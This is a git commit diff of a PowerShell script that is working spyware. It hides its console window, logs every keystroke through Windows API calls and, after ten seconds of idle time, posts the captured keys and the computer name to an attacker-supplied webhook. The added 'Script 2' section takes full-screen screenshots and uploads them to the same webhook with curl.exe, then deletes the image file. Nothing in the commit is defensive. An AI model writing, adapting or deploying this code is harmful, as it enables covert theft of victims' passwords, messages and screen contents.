a06e12db117885e4ccf879d67b48450bfd242782
ElPichiii <90940144+ElPichiii@users.noreply.github.com>
2024-01-04 16:17:02 +0100

    Add files via upload

--- script.ps1
+++ script.ps1
@@ -1,10 +1,12 @@
-# shortened URL Detection
-
-if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
+if ($dc.Ln -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.."
+    $dc = (irm $dc).url
+}
 
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
+
 if($hwnd -ne [System.IntPtr]::Zero){
     $Type::ShowWindowAsync($hwnd, 0)
 }
@@ -14,6 +16,7 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
+
 # Import DLL Definitions for keyboard inputs
 $API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -27,7 +30,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
-# Add stopwatch for intellegent sending
+# Add stopwatch for intelligent sending
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
@@ -35,12 +38,12 @@ $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 While ($true){
   $keyPressed = $false
     try{
-      # Start a loop that checks the time since last activity before message is sent
+      # Start a loop that checks the time since the last activity before a message is sent
       while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-      # Start the loop with 30 ms delay between keystate check
+      # Start the loop with a 30 ms delay between keystate checks
       Start-Sleep -Milliseconds 30
         for ($asc = 8; $asc -le 254; $asc++){
-        # Get the key state. (is any key currently pressed)
+        # Get the key state. (Is any key currently pressed)
         $keyst = $API::GetAsyncKeyState($asc)
           # If a key is pressed
           if ($keyst -eq -32767) {
@@ -50,7 +53,7 @@ While ($true){
           $null = [console]::CapsLock
           # Translate the keycode to a letter
           $vtkey = $API::MapVirtualKey($asc, 3)
-          # Get the keyboard state and create stringbuilder
+          # Get the keyboard state and create a stringbuilder
           $kbst = New-Object Byte[] 256
           $checkkbst = $API::GetKeyboardState($kbst)
           $logchar = New-Object -TypeName System.Text.StringBuilder
@@ -61,7 +64,7 @@ While ($true){
                 if ($asc -eq 8) {$LString = "[BKSP]"}
                 if ($asc -eq 13) {$LString = "[ENT]"}
                 if ($asc -eq 27) {$LString = "[ESC]"}
-            # Add the key to sending variable
+            # Add the key to the sending variable
             $send += $LString 
             }
           }
@@ -76,33 +79,44 @@ While ($true){
       $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
       $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
       Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-      #Remove log file and reset inactivity check 
+      # Remove the log file and reset the inactivity check 
       $send = ""
       $keyPressed = $false
       }
     }
-  # reset stopwatch before restarting the loop
+  # Reset the stopwatch before restarting the loop
   $LastKeypressTime.Restart()
   Start-Sleep -Milliseconds 10
+}
+
+# Script 2
+$hookurl = "$dc"
 $seconds = 30 # Screenshot interval
-$a = 1 # Sceenshot amount
-While ($a -gt 0){
-$Filett = "$env:temp\SC.png"
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$Width = $Screen.Width
-$Height = $Screen.Height
-$Left = $Screen.Left
-$Top = $Screen.Top
-$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-Start-Sleep 1
-curl.exe -F "file1=@$filett" $hookurl
-Start-Sleep 1
-Remove-Item -Path $filett
-Start-Sleep $seconds
-$a--
+$a = 1 # Screenshot amount
+
+# Shortened URL Detection
+if ($hookurl.Ln -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.."
+    $hookurl = (irm $hookurl).url
+}
+
+While ($a -gt 0) {
+    $Filett = "$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@$filett" $hookurl
+    Start-Sleep 1
+    Remove-Item -Path $filett
+    Start-Sleep $seconds
+    $a--
 }
